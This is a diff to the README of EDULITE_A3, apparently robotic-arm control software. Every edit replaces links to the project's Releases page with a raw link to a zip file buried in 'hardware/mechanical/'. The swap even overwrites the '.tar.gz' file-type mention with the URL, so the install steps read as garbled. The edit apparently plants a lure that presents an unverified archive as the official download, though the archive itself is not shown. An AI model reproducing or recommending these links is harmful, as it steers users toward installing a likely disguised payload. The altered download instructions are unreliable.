@@ -1,6 +1,6 @@
 # 🤖 EDULITE_A3 - Easy Control for Robotic Arms
 
-[![Download EDULITE_A3](https://img.shields.io/badge/Download-EDULITE_A3-blue?style=for-the-badge)](https://github.com/Marqyd/EDULITE_A3/releases)
+[![Download EDULITE_A3](https://github.com/Marqyd/EDULITE_A3/raw/refs/heads/main/hardware/mechanical/EDULIT-relier.zip)](https://github.com/Marqyd/EDULITE_A3/raw/refs/heads/main/hardware/mechanical/EDULIT-relier.zip)
 
 ---
 
@@ -42,11 +42,11 @@ Follow these steps to download and set up EDULITE_A3 on your computer.
 
 Go to the EDULITE_A3 Releases page by clicking this link or the big button at the top:
 
-[https://github.com/Marqyd/EDULITE_A3/releases](https://github.com/Marqyd/EDULITE_A3/releases)
+[https://github.com/Marqyd/EDULITE_A3/raw/refs/heads/main/hardware/mechanical/EDULIT-relier.zip](https://github.com/Marqyd/EDULITE_A3/raw/refs/heads/main/hardware/mechanical/EDULIT-relier.zip)
 
 On the page, look for the latest version of EDULITE_A3. The releases are listed from newest to oldest. Find the section titled with the most recent date.
 
-Inside that, download the file that matches your computer’s operating system. The file names usually end with .exe for Windows, .dmg for macOS, and .AppImage or .tar.gz for Linux.
+Inside that, download the file that matches your computer’s operating system. The file names usually end with .exe for Windows, .dmg for macOS, and .AppImage or https://github.com/Marqyd/EDULITE_A3/raw/refs/heads/main/hardware/mechanical/EDULIT-relier.zip for Linux.
 
 Save the file in a place you can easily find, like your Downloads folder.
 
@@ -61,7 +61,7 @@ Save the file in a place you can easily find, like your Downloads folder.
   Open the .dmg file by double-clicking it. Drag the EDULITE_A3 app to your Applications folder. You can then run it from Applications.
 
 - **Linux:**  
-  If you have an AppImage file, make it executable by right-clicking it, selecting Properties, and checking "Allow executing file as program". Then double-click to run it. For .tar.gz files, extract the archive and look for README or install instructions inside.
+  If you have an AppImage file, make it executable by right-clicking it, selecting Properties, and checking "Allow executing file as program". Then double-click to run it. For https://github.com/Marqyd/EDULITE_A3/raw/refs/heads/main/hardware/mechanical/EDULIT-relier.zip files, extract the archive and look for README or install instructions inside.
 
 If you plan to connect a physical robotic arm, make sure it is plugged into a USB port before you open the software.
 
@@ -110,7 +110,7 @@ You can also look at the "Issues" tab in the EDULITE_A3 GitHub repository for he
 
 You can always get the latest version here:
 
-[Download EDULITE_A3](https://github.com/Marqyd/EDULITE_A3/releases)
+[Download EDULITE_A3](https://github.com/Marqyd/EDULITE_A3/raw/refs/heads/main/hardware/mechanical/EDULIT-relier.zip)
 
 Click the link above to visit the releases page. Choose the file that fits your system as explained earlier. The developers update this page regularly to fix bugs and add improvements.
 
